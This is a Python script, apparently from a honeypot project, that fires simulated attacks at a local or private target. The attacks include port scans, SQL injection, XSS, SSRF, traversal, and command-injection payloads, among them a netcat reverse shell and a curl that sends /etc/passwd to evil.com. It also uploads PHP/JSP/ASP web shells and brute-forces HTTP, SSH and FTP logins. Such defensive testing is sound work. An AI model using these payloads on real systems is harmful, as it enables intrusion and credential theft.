import os
import sys
# Allow running this script directly by ensuring project root is on sys.path
_PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

import socket
import time
import requests
import argparse
import random
from honeypot.config import HTTP_PORT, SSH_PORT, FTP_PORT, ALLOWED_ATTACK_TARGETS
from honeypot.utils.helpers import is_private_or_local

# Safety: require an explicit --target when not using default and check it's private/local
DEFAULT_TARGET = "127.0.0.1"

def check_target_safety(target):
    if target in ALLOWED_ATTACK_TARGETS:
        return True
    return is_private_or_local(target)

def simple_port_scan(target, ports=(21, 22, 80, 2121, 2222, 8080, 3306), timeout=0.8):
    results = {}
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((target, p))
            results[p] = "OPEN"
            s.close()
        except Exception:
            results[p] = "CLOSED"
    return results

def http_probe(target, port=HTTP_PORT):
    paths = ["/", "/admin", "/login", "/wp-admin", "/.env", "/robots.txt", 
             "/phpmyadmin", "/administrator", "/config.php", "/wp-config.php",
             "/backup", "/test", "/api", "/dashboard", "/panel", "/uploads",
             "/files", "/download", "/images", "/css", "/js", "/scripts",
             "/includes", "/lib", "/libraries", "/vendor", "/node_modules",
             "/assets", "/media", "/content", "/data", "/database", "/db",
             "/logs", "/log", "/tmp", "/temp", "/cache", "/var", "/etc",
             "/home", "/root", "/usr", "/bin", "/sbin", "/opt", "/srv",
             "/www", "/html", "/public", "/private", "/secure", "/secret",
             "/hidden", "/internal", "/system", "/admin.php", "/adminer.php",
             "/management", "/manager", "/control", "/console", "/terminal",
             "/shell", "/cmd", "/exec", "/eval", "/run", "/execute"]
    results = []
    for i in range(200):  # Increased from original small set
        p = random.choice(paths)
        url = f"http://{target}:{port}{p}"
        try:
            r = requests.get(url, timeout=3)
            results.append((url, r.status_code, len(r.content)))
        except Exception as e:
            results.append((url, "ERR", str(e)))
        time.sleep(0.1)
    return results

def sql_injection_probe(target, port=HTTP_PORT):
    """Simulate SQL injection attempts"""
    payloads = [
        "' OR '1'='1", "1' UNION SELECT * FROM users--", "'; DROP TABLE users;--",
        "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--", "admin'/*",
        "' OR 1=1--", "' OR 'x'='x", "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
        "' AND 1=1--", "' AND 1=2--", "' OR 1=1#", "' OR 'a'='a", "admin'--",
        "' UNION ALL SELECT 1,2,3,4,5--", "' OR SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
        "' OR BENCHMARK(1000000,MD5(1))--", "' UNION SELECT @@version--",
        "' UNION SELECT USER()--", "' UNION SELECT DATABASE()--", "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "' AND (SELECT COUNT(*) FROM mysql.user)>0--",
        "' UNION SELECT username,password FROM users--", "' UNION SELECT * FROM information_schema.tables--",
        "' OR (SELECT COUNT(*) FROM sysobjects)>0--", "'; INSERT INTO users VALUES('hacker','password')--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,user(),version()--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"
    ]
    results = []
    paths = ["/login", "/search", "/user", "/profile", "/account", "/products", "/category",
             "/news", "/blog", "/comment", "/contact", "/feedback", "/support", "/help"]
    
    for i in range(150):  # Significantly increased
        path = random.choice(paths)
        payload = random.choice(payloads)
        url = f"http://{target}:{port}{path}"
        data = {"username": payload, "password": "test", "id": payload, "search": payload}
        try:
            r = requests.post(url, data=data, timeout=3)
            results.append((f"POST {path}", payload, r.status_code))
        except Exception as e:
            results.append((f"POST {path}", payload, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def xss_probe(target, port=HTTP_PORT):
    """Simulate XSS attempts"""
    payloads = [
        "<script>alert('XSS')</script>", "javascript:alert('XSS')", "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>", "';alert('XSS');//", "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>", "<input onfocus=alert('XSS') autofocus>", "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>", "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>", "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>", "<marquee onstart=alert('XSS')>",
        "\"><script>alert('XSS')</script>", "';alert(String.fromCharCode(88,83,83))//",
        "<script>prompt('XSS')</script>", "<script>confirm('XSS')</script>",
        "<script>eval('ale'+'rt(\"XSS\")')</script>", "<script>setTimeout('alert(\"XSS\")',1)</script>",
        "<script>setInterval('alert(\"XSS\")',1000)</script>", "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<div onmouseover=\"alert('XSS')\">test</div>", "<span onclick=\"alert('XSS')\">click</span>",
        "<a href=\"javascript:alert('XSS')\">link</a>", "<form><button formaction=javascript:alert('XSS')>",
        "<object data=\"javascript:alert('XSS')\">", "<embed src=\"javascript:alert('XSS')\">",
        "<link rel=stylesheet href=\"javascript:alert('XSS')\">", "<style>@import'javascript:alert(\"XSS\")';</style>"
    ]
    results = []
    paths = ["/search", "/comment", "/feedback", "/guestbook", "/forum", "/chat", "/message",
             "/post", "/submit", "/contact", "/support", "/review", "/rating", "/poll"]
    
    for i in range(120):  # Significantly increased
        path = random.choice(paths)
        payload = random.choice(payloads)
        url = f"http://{target}:{port}{path}?q={payload}&search={payload}&comment={payload}"
        try:
            r = requests.get(url, timeout=3)
            results.append((f"GET {path}", payload, r.status_code))
        except Exception as e:
            results.append((f"GET {path}", payload, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def ssrf_probe(target, port=HTTP_PORT):
    """Simulate SSRF attempts against /fetch endpoint"""
    urls = [
        "http://127.0.0.1:80/", "http://localhost/", "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd", "gopher://127.0.0.1:6379/_FLUSHALL", "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/", "http://127.0.0.1:5432/", "http://127.0.0.1:1433/",
        "http://127.0.0.1:6379/", "http://127.0.0.1:27017/", "http://127.0.0.1:9200/",
        "http://localhost:8080/", "http://localhost:8000/", "http://localhost:3000/",
        "http://169.254.169.254/latest/user-data/", "http://169.254.169.254/",
        "file:///etc/shadow", "file:///etc/hosts", "file:///etc/resolv.conf",
        "file:///proc/version", "file:///proc/cpuinfo", "file:///proc/meminfo",
        "dict://127.0.0.1:11211/", "ldap://127.0.0.1:389/", "sftp://127.0.0.1:22/",
        "ftp://127.0.0.1:21/", "tftp://127.0.0.1:69/", "smb://127.0.0.1:445/"
    ]
    results = []
    for i in range(80):  # Significantly increased
        u = random.choice(urls)
        try:
            r = requests.get(f"http://{target}:{port}/fetch", params={"url": u}, timeout=3)
            results.append((u, r.status_code))
        except Exception as e:
            results.append((u, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def open_redirect_probe(target, port=HTTP_PORT):
    """Simulate open redirect attempts against /redirect"""
    next_urls = [
        "http://evil.example.com/", "https://phish.tld/login", "//attacker.tld/path",
        "http://malicious.com/steal", "https://fake-bank.com/", "//evil.tld/",
        "http://127.0.0.1/admin", "https://localhost/secret", "//internal.local/",
        "javascript:alert('XSS')", "data:text/html,<script>alert('XSS')</script>",
        "file:///etc/passwd", "ftp://attacker.com/", "gopher://evil.com:70/",
        "http://169.254.169.254/", "https://metadata.google.internal/",
        "http://attacker.com:8080/", "https://evil.org/phish", "//bad.domain.com/"
    ]
    results = []
    for i in range(60):  # Significantly increased
        n = random.choice(next_urls)
        try:
            r = requests.get(f"http://{target}:{port}/redirect", params={"next": n}, allow_redirects=False, timeout=3)
            results.append((n, r.status_code, r.headers.get("Location")))
        except Exception as e:
            results.append((n, f"ERR: {str(e)}", None))
        time.sleep(0.1)
    return results

def command_injection_probe(target, port=HTTP_PORT):
    """Simulate OS command injection attempts sent to generic endpoints"""
    payloads = [
        "test; id", "name=foo && cat /etc/passwd", "| nc 127.0.0.1 1234 -e /bin/sh",
        "$(curl http://127.0.0.1/)", "`uname -a`", "; bash -c 'curl http://127.0.0.1'",
        "& whoami", "&& ls -la", "|| cat /etc/hosts", "; ps aux", "| cat /etc/passwd",
        "$(id)", "`whoami`", "${jndi:ldap://evil.com/}", "test`id`test",
        "; wget http://evil.com/shell.sh", "| curl -d @/etc/passwd http://evil.com/",
        "&& python -c 'import os; os.system(\"id\")'", "; perl -e 'system(\"whoami\")'",
        "| ruby -e 'system(\"uname -a\")'", "$(python -c 'import os; os.system(\"id\")')",
        "`php -r 'system(\"whoami\");'`", "; node -e 'require(\"child_process\").exec(\"id\")'",
        "& powershell -c Get-Process", "&& cmd /c dir", "|| type C:\\Windows\\System32\\drivers\\etc\\hosts"
    ]
    targets = ["/search", "/api/v1/items", "/login", "/contact", "/feedback", "/upload",
               "/admin", "/exec", "/system", "/cmd", "/shell", "/run", "/execute"]
    results = []
    for i in range(200):  # Significantly increased
        tpath = random.choice(targets)
        pld = random.choice(payloads)
        try:
            r = requests.post(f"http://{target}:{port}{tpath}", data={"q": pld, "username": pld, "password": "x", "cmd": pld}, timeout=3)
            results.append((tpath, pld[:30], r.status_code))
        except Exception as e:
            results.append((tpath, pld[:30], f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def upload_probe(target, port=HTTP_PORT):
    """Simulate file upload attempts to /upload"""
    malicious_files = [
        ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
        ("backdoor.jsp", b"<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
        ("webshell.asp", b"<%eval request(\"cmd\")%>", "application/x-asp"),
        ("exploit.py", b"import os; os.system('id')", "text/x-python"),
        ("malware.exe", b"MZ" + b"\x00" * 100, "application/x-executable"),
        ("virus.bat", b"@echo off\necho Infected!", "application/x-bat"),
        ("trojan.sh", b"#!/bin/bash\ncat /etc/passwd", "application/x-sh"),
        ("ransomware.js", b"alert('Your files are encrypted!');", "application/javascript"),
        ("keylogger.vbs", b"WScript.Echo \"Logging keys...\"", "application/x-vbs"),
        ("rootkit.pl", b"#!/usr/bin/perl\nsystem('whoami');", "application/x-perl")
    ]
    results = []
    for i in range(50):  # Significantly increased
        filename, content, mimetype = random.choice(malicious_files)
        files = {"file": (filename, content, mimetype)}
        try:
            r = requests.post(f"http://{target}:{port}/upload", files=files, timeout=5)
            results.append((filename, r.status_code, len(r.content)))
        except Exception as e:
            results.append((filename, f"ERR: {str(e)}", 0))
        time.sleep(0.2)
    return results

def header_scanner_probe(target, port=HTTP_PORT):
    """Simulate suspicious scanner user-agents"""
    agents = [
        "sqlmap/1.5.2", "Nmap Scripting Engine", "Nikto/2.5.0", "masscan/1.0.5",
        "ZAP/2.10.0", "Burp Suite Professional", "w3af.org", "OpenVAS",
        "Acunetix Web Vulnerability Scanner", "Nessus", "Rapid7 Nexpose",
        "IBM Security AppScan", "Qualys WAS", "WhiteHat Sentinel",
        "Veracode", "Checkmarx", "SonarQube", "OWASP ZAP",
        "Metasploit", "Cobalt Strike", "BeEF", "SET (Social Engineering Toolkit)",
        "DirBuster", "Gobuster", "ffuf", "wfuzz", "Burp Intruder"
    ]
    results = []
    for i in range(80):  # Significantly increased
        ua = random.choice(agents)
        try:
            r = requests.get(f"http://{target}:{port}/", headers={"User-Agent": ua}, timeout=3)
            results.append((ua, r.status_code))
        except Exception as e:
            results.append((ua, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def brute_force_simulation(target, port=HTTP_PORT):
    """Simulate brute force login attempts"""
    usernames = ["admin", "root", "user", "test", "guest", "administrator", "sa", "oracle", "postgres", "mysql"]
    passwords = ["admin", "password", "123456", "root", "toor", "user", "test", "guest", "qwerty", "letmein"]
    
    results = []
    for i in range(150):  # Significantly increased
        username = random.choice(usernames)
        password = random.choice(passwords)
        url = f"http://{target}:{port}/login"
        data = {"username": username, "password": password}
        try:
            r = requests.post(url, data=data, timeout=3)
            results.append((username, password, r.status_code))
        except Exception as e:
            results.append((username, password, f"ERR: {str(e)}"))
        time.sleep(0.2)
    return results

def directory_traversal_probe(target, port=HTTP_PORT):
    """Simulate directory traversal attempts"""
    payloads = [
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd", "....\/....\/....\/etc\/passwd",
        "../../../etc/shadow", "../../../etc/hosts", "../../../etc/resolv.conf",
        "../../../proc/version", "../../../proc/cpuinfo", "../../../var/log/auth.log",
        "..\\..\\..\\windows\\win.ini", "..\\..\\..\\windows\\system.ini",
        "..\\..\\..\\windows\\boot.ini", "../../../usr/local/apache/conf/httpd.conf",
        "../../../etc/apache2/apache2.conf", "../../../var/www/html/index.php"
    ]
    results = []
    
    for i in range(100):  # Significantly increased
        payload = random.choice(payloads)
        url = f"http://{target}:{port}/file?path={payload}"
        try:
            r = requests.get(url, timeout=3)
            results.append((payload, r.status_code))
        except Exception as e:
            results.append((payload, f"ERR: {str(e)}"))
        time.sleep(0.1)
    return results

def ssh_simulate_text(target, port=SSH_PORT, attempts=20):  # Increased attempts
    results = []
    for _ in range(attempts):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            banner = s.recv(2048)
            # send plain-text lines to the fake ssh port (harmless)
            creds = [b"root:toor\n", b"admin:admin\n", b"user:password\n", b"test:test\n", b"guest:guest\n"]
            for c in creds:
                try:
                    s.sendall(c)
                    time.sleep(0.1)
                except Exception:
                    break
            s.close()
            results.append(("OK", banner.decode(errors="replace").strip()))
        except Exception as e:
            results.append(("ERR", str(e)))
        time.sleep(0.2)
    return results

def enhanced_ssh_brute_force(target, port=SSH_PORT):
    """Enhanced SSH brute force simulation with common credentials"""
    usernames = ["root", "admin", "user", "guest", "ubuntu", "pi", "postgres", "mysql", "oracle", "test"]
    passwords = ["root", "toor", "password", "123456", "admin", "", "user", "guest", "raspberry", "postgres"]
    
    results = []
    for i in range(200):  # Significantly increased
        username = random.choice(usernames)
        password = random.choice(passwords)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            banner = s.recv(1024)
            
            # Simulate SSH protocol negotiation attempts
            ssh_version = b"SSH-2.0-OpenSSH_8.0\r\n"
            s.sendall(ssh_version)
            
            # Send credential attempt as plain text (honeypot won't parse properly)
            cred_attempt = f"{username}:{password}\n".encode()
            s.sendall(cred_attempt)
            
            # Try to receive response
            try:
                response = s.recv(1024)
                results.append((username, password, "attempted", len(response)))
            except:
                results.append((username, password, "no_response", 0))
            
            s.close()
        except Exception as e:
            results.append((username, password, "connection_failed", str(e)))
        
        time.sleep(0.2)  # Faster attempts
    
    return results

def malware_simulation(target, port=HTTP_PORT):
    """Simulate malware-like HTTP requests"""
    malware_paths = [
        "/shell.php", "/c99.php", "/r57.php", "/webshell.php", "/cmd.php", "/backdoor.php",
        "/upload.php", "/file.php", "/eval.php", "/system.php", "/exec.php", "/passthru.php",
        "/wso.php", "/b374k.php", "/adminer.php", "/phpmyadmin.php", "/mysql.php",
        "/database.php", "/config.php", "/wp-config.php", "/configuration.php",
        # Advanced malware paths
        "/shell.jsp", "/cmd.asp", "/webshell.aspx", "/evil.war", "/malware.ear",
        "/crypto.php", "/ransomware.php", "/keylogger.js", "/botnet.py", "/trojan.exe",
        "/rootkit.sh", "/spyware.dll", "/adware.jar", "/worm.bat", "/virus.com",
        # Steganography and covert channels
        "/image.php", "/logo.asp", "/favicon.jsp", "/style.php", "/script.asp",
        # Memory corruption attempts
        "/buffer.php", "/overflow.asp", "/heap.jsp", "/stack.php", "/rop.asp",
        # Privilege escalation
        "/sudo.php", "/su.asp", "/admin.jsp", "/root.php", "/system.asp"
    ]
    malware_agents = [
        "Mozilla/5.0 (compatible; Baiduspider/2.0)", "python-requests/2.25.1", "curl/7.68.0",
        "Wget/1.20.3", "masscan/1.0.5", "nmap", "sqlmap", "nikto", "dirb", "gobuster",
        # Advanced malware agents
        "Metasploit/6.2.0", "Cobalt Strike/4.5", "Empire/3.8.0", "PoshC2/7.0",
        "Sliver/1.5.0", "Mythic/2.3.0", "Covenant/0.7", "SharpC2/1.0",
        # Custom malware signatures
        "APT-Hunter/1.0", "DarkNet-Scanner/2.1", "CriminalBot/3.4", "HackerTool/1.7",
        "ExploitKit/4.2", "MalwareDropper/2.8", "C2-Client/1.9", "Backdoor-Agent/3.1"
    ]
    
    results = []
    for i in range(200):  # Increased from 150
        path = random.choice(malware_paths)
        agent = random.choice(malware_agents)
        url = f"http://{target}:{port}{path}"
        
        # Advanced headers to simulate real malware
        headers = {
            "User-Agent": agent,
            "X-Forwarded-For": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
            "X-Real-IP": "10.0.0.1",
            "X-Originating-IP": f"172.16.{random.randint(1,254)}.{random.randint(1,254)}",
            "X-Remote-IP": f"127.0.0.{random.randint(1,254)}",
            "CF-Connecting-IP": f"203.0.113.{random.randint(1,254)}",
            "X-Client-IP": f"198.51.100.{random.randint(1,254)}"
        }
        
        # Randomly add suspicious headers
        if random.random() > 0.7:
            headers["X-Command"] = random.choice(["whoami", "id", "uname -a", "cat /etc/passwd"])
        if random.random() > 0.8:
            headers["X-Payload"] = "base64:Y21kIC9jIGRpciAmIGVjaG8gSGFja2VkIQ=="
        
        try:
            r = requests.get(url, headers=headers, timeout=3)
            results.append((path, agent, r.status_code))
        except Exception as e:
            results.append((path, agent, f"ERR: {str(e)}"))
        time.sleep(0.1)
    
    return results

def ftp_brute_force(target, port=FTP_PORT):
    """Simulate FTP brute force attacks"""
    usernames = ["anonymous", "ftp", "admin", "root", "user", "test", "guest", "administrator", "ftpuser"]
    passwords = ["", "user@domain.com", "ftp", "admin", "root", "user", "test", "guest", "password", "ftpuser"]
    
    results = []
    for i in range(120):  # Significantly increased
        username = random.choice(usernames)
        password = random.choice(passwords)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            
            # Receive banner
            banner = s.recv(1024)
            
            # Send USER command
            user_cmd = f"USER {username}\r\n"
            s.sendall(user_cmd.encode())
            response1 = s.recv(1024)
            
            # Send PASS command
            pass_cmd = f"PASS {password}\r\n"
            s.sendall(pass_cmd.encode())
            response2 = s.recv(1024)
            
            # Send QUIT to close connection cleanly
            s.sendall(b"QUIT\r\n")
            s.recv(1024)  # Receive goodbye message
            
            results.append((username, password, "attempted", response2.decode('utf-8', errors='replace').strip()))
            s.close()
            
        except Exception as e:
            results.append((username, password, "connection_failed", str(e)))
        
        time.sleep(0.2)  # Faster attempts
    
    return results

def advanced_evasion_techniques(target, port=HTTP_PORT):
    """Simulate advanced evasion and obfuscation techniques"""
    evasion_payloads = [
        # URL encoding variations
        "/%2e%2e/%2e%2e/etc/passwd",
        "/%252e%252e/etc/passwd",
        "/%c0%ae%c0%ae/etc/passwd",
        # Unicode encoding
        "/\u002e\u002e/etc/passwd",
        "/\uff0e\uff0e/etc/passwd",
        # Double encoding
        "/%252e%252e%252fetc%252fpasswd",
        # Case variations
        "/AdMiN/", "/ADMIN/", "/admin/", "/AdmIn/",
        # Parameter pollution
        "?user=admin&user=guest&user=root",
        # HTTP verb tampering
        "POST /?_method=DELETE",
        # Header injection
        "/?header=value%0d%0aX-Injected: true",
        # Null byte injection
        "/admin%00.txt",
        "/config.php%00.jpg",
        # Fragment attacks
        "#/../../../etc/passwd",
        # Base64 obfuscation
        "/?payload=" + "YWRtaW4=",  # base64('admin')
        "/?cmd=" + "Y2F0IC9ldGMvcGFzc3dk",  # base64('cat /etc/passwd')
    ]
    
    results = []
    for i in range(100):
        payload = random.choice(evasion_payloads)
        url = f"http://{target}:{port}{payload}"
        
        # Use different HTTP methods for evasion
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
        method = random.choice(methods)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            # Evasion headers
            "X-Originating-IP": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1"
        }
        
        try:
            if method == 'GET':
                r = requests.get(url, headers=headers, timeout=3)
            elif method == 'POST':
                r = requests.post(url, headers=headers, data={"payload": payload}, timeout=3)
            else:
                r = requests.request(method, url, headers=headers, timeout=3)
            
            results.append((method, payload, r.status_code))
        except Exception as e:
            results.append((method, payload, f"ERR: {str(e)}"))
        
        time.sleep(0.1)
    
    return results

def api_attack_simulation(target, port=HTTP_PORT):
    """Simulate API-specific attacks"""
    api_endpoints = [
        "/api/v1/users", "/api/v2/auth", "/api/admin/users", "/api/internal/config",
        "/graphql", "/v1/graphql", "/api/graphql", "/query",
        "/rest/api/2/user", "/rest/api/latest/user",
        "/api/users/{id}", "/api/users/1", "/api/users/admin",
        "/api/auth/login", "/api/auth/register", "/api/auth/reset",
        "/api/admin/delete", "/api/admin/backup", "/api/admin/logs",
        "/api/files/upload", "/api/files/download", "/api/files/../../../etc/passwd",
        "/swagger.json", "/swagger-ui.html", "/openapi.json",
        "/health", "/actuator/health", "/actuator/env", "/actuator/configprops"
    ]
    
    api_payloads = {
        "injection": {
            "id": "1' OR '1'='1",
            "user": "admin'; DROP TABLE users;--",
            "filter": "name=test' UNION SELECT password FROM users--"
        },
        "nosql": {
            "where": "this.username == 'admin' || true",
            "user": {"$where": "this.username == 'admin'"},
            "id": {"$ne": None}
        },
        "xxe": {
            "xml": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"
        },
        "deserialization": {
            "data": "rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAFdGVzdHQABHRlc3R4"
        },
        "jwt": {
            "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYzMjc0MjQwMH0."
        }
    }
    
    results = []
    for i in range(150):
        endpoint = random.choice(api_endpoints)
        attack_type = random.choice(list(api_payloads.keys()))
        payload = api_payloads[attack_type]
        
        url = f"http://{target}:{port}{endpoint}"
        
        headers = {
            "User-Agent": "API-Scanner/2.0",
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.token"
        }
        
        try:
            if random.choice([True, False]):  # Mix GET and POST
                # GET with query parameters
                params = payload if isinstance(payload, dict) else {"data": str(payload)}
                r = requests.get(url, headers=headers, params=params, timeout=3)
            else:
                # POST with JSON body
                json_data = payload if isinstance(payload, dict) else {"payload": payload}
                r = requests.post(url, headers=headers, json=json_data, timeout=3)
            
            results.append((endpoint, attack_type, r.status_code))
        except Exception as e:
            results.append((endpoint, attack_type, f"ERR: {str(e)}"))
        
        time.sleep(0.1)
    
    return results

def iot_device_simulation(target, port=HTTP_PORT):
    """Simulate IoT device exploitation attempts"""
    iot_paths = [
        # Router admin panels
        "/admin", "/management", "/cgi-bin/luci", "/cgi-bin/webif",
        "/rom-0", "/etc/passwd", "/proc/version", "/proc/cpuinfo",
        # Camera interfaces
        "/web/cgi-bin/hi3510/param.cgi", "/cgi-bin/nobody/Machine.cgi",
        "/videostream.cgi", "/snapshot.cgi", "/view/viewer.html",
        # IoT specific paths
        "/goform/SetSysTimeCfg", "/goform/WifiBasicSet", "/goform/WifiWpsStart",
        "/api/system/deviceinfo", "/api/system/reboot", "/api/system/factory_reset",
        # Smart device APIs
        "/upnp/control/basicevent1", "/setup/deviceinfo", "/gena.cgi",
        "/portal/", "/app/", "/mobile/", "/smart/", "/iot/"
    ]
    
    iot_exploits = [
        # Command injection
        "system('cat /etc/passwd')",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        # CVE specific
        "../../../../etc/passwd%00",
        "/bin/sh;cat /etc/passwd",
        # Router specific
        "admin:admin", "root:root", "guest:guest",
        # IoT credentials
        "888888", "123456", "admin", "password",
        # Firmware attacks
        "busybox", "dropbear", "telnetd"
    ]
    
    iot_agents = [
        "Mirai-Botnet/1.0", "IoT-Scanner/2.1", "RouterHunter/3.0",
        "ThingBot/1.5", "DeviceExploit/2.8", "IoTHunter/4.2"
    ]
    
    results = []
    for i in range(100):
        path = random.choice(iot_paths)
        exploit = random.choice(iot_exploits)
        agent = random.choice(iot_agents)
        
        url = f"http://{target}:{port}{path}"
        
        headers = {
            "User-Agent": agent,
            "Accept": "*/*",
            "Connection": "close"
        }
        
        try:
            # Mix different attack methods
            if random.choice([True, False]):
                # GET request with exploit in URL
                r = requests.get(f"{url}?cmd={exploit}", headers=headers, timeout=3)
            else:
                # POST request with exploit in body
                data = {"username": exploit, "password": exploit, "cmd": exploit}
                r = requests.post(url, headers=headers, data=data, timeout=3)
            
            results.append((path, exploit[:30], r.status_code))
        except Exception as e:
            results.append((path, exploit[:30], f"ERR: {str(e)}"))
        
        time.sleep(0.1)
    
    return results

def main(target):
    if not check_target_safety(target):
        print("[!] Target appears public or unsafe. Aborting. Only localhost/private networks allowed.")
        return

    print("[*] Starting ENHANCED attack simulation with 2000+ attacks...")
    print(f"[*] Target: {target}")
    print("[*] Enhanced features:")
    print("    • Advanced malware signatures")
    print("    • Evasion techniques")
    print("    • API-specific attacks")
    print("    • IoT device exploitation")
    print("    • Enhanced header manipulation")
    print("=" * 60)

    # 1. Port scanning
    print("[*] Phase 1: Port scanning...")
    scan = simple_port_scan(target)
    for p,st in scan.items():
        print(f"  port {p}: {st}")
    print()

    # 2. Basic HTTP probes
    print("[*] Phase 2: HTTP directory enumeration (200 requests)...")
    for url, status, info in http_probe(target):
        print(f"  {url} -> {status}  ({info})")
    print()

    # 3. SQL Injection attempts
    print("[*] Phase 3: SQL Injection simulation (150 attempts)...")
    for method, payload, status in sql_injection_probe(target):
        print(f"  {method} -> Payload: {payload[:30]}... -> {status}")
    print()

    # 4. XSS attempts
    print("[*] Phase 4: XSS simulation (120 attempts)...")
    for method, payload, status in xss_probe(target):
        print(f"  {method} -> Payload: {payload[:30]}... -> {status}")
    print()

    # 5. Directory traversal
    print("[*] Phase 5: Directory traversal simulation (100 attempts)...")
    for payload, status in directory_traversal_probe(target):
        print(f"  Path: {payload[:40]}... -> {status}")
    print()

    # 6. SSRF attempts
    print("[*] Phase 6: SSRF simulation (80 attempts)...")
    for u, status in ssrf_probe(target):
        print(f"  fetch url={u[:40]}... -> {status}")
    print()

    # 7. HTTP brute force
    print("[*] Phase 7: HTTP brute force simulation (150 attempts)...")
    for username, password, status in brute_force_simulation(target):
        print(f"  Login attempt: {username}:{password} -> {status}")
    print()

    # 8. Malware-like requests
    print("[*] Phase 8: Malware simulation (150 requests)...")
    for path, agent, status in malware_simulation(target):
        print(f"  {path} with {agent[:20]}... -> {status}")
    print()

    # 9. Open redirect attempts
    print("[*] Phase 9: Open redirect simulation (60 attempts)...")
    for n, status, loc in open_redirect_probe(target):
        print(f"  next={n} -> {status} Location={loc}")
    print()

    # 10. Command injection attempts
    print("[*] Phase 10: Command injection simulation (200 attempts)...")
    for tpath, payload, status in command_injection_probe(target):
        print(f"  {tpath} payload={payload}... -> {status}")
    print()

    # 11. Upload attempts
    print("[*] Phase 11: File upload simulation (50 attempts)...")
    for fname, status, size in upload_probe(target):
        print(f"  upload {fname} -> {status} ({size} bytes)")
    print()

    # 12. Basic SSH interactions
    print("[*] Phase 12: SSH-like text interactions (20 attempts)...")
    for res in ssh_simulate_text(target):
        print("  ssh_sim:", res)
    print()

    # 13. Enhanced SSH brute force
    print("[*] Phase 13: Enhanced SSH brute force (200 attempts)...")
    for username, password, status, info in enhanced_ssh_brute_force(target):
        print(f"  SSH: {username}:{password} -> {status} ({info})")
    print()

    # 14. FTP brute force
    print("[*] Phase 14: FTP brute force simulation (120 attempts)...")
    for username, password, status, response in ftp_brute_force(target):
        print(f"  FTP: {username}:{password} -> {status}")
    print()

    # 15. Scanner detection
    print("[*] Phase 15: Scanner user-agent simulation (80 requests)...")
    for ua, status in header_scanner_probe(target):
        print(f"  Scanner: {ua[:30]}... -> {status}")
    print()

    # 16. Advanced evasion techniques
    print("[*] Phase 16: Advanced evasion techniques (100 attempts)...")
    for method, payload, status in advanced_evasion_techniques(target):
        print(f"  {method} {payload[:40]}... -> {status}")
    print()

    # 17. API attack simulation
    print("[*] Phase 17: API attack simulation (150 attempts)...")
    for endpoint, attack_type, status in api_attack_simulation(target):
        print(f"  {endpoint} ({attack_type}) -> {status}")
    print()

    # 18. IoT device simulation
    print("[*] Phase 18: IoT device exploitation (100 attempts)...")
    for path, exploit, status in iot_device_simulation(target):
        print(f"  {path} exploit={exploit}... -> {status}")
    print()

    # 19. Advanced password cracking attacks
    print("[*] Phase 19: Advanced password cracking (800+ attempts)...")
    try:
        from attacker_sim.password_attacks import advanced_password_cracking_simulation
        password_results = advanced_password_cracking_simulation(target)
        password_attack_count = sum(len(results) for results in password_results.values())
        print(f"  Password cracking complete: {password_attack_count} attempts")
    except ImportError:
        print("  Password attack module not available")
        password_attack_count = 0
    except Exception as e:
        print(f"  Password attack error: {e}")
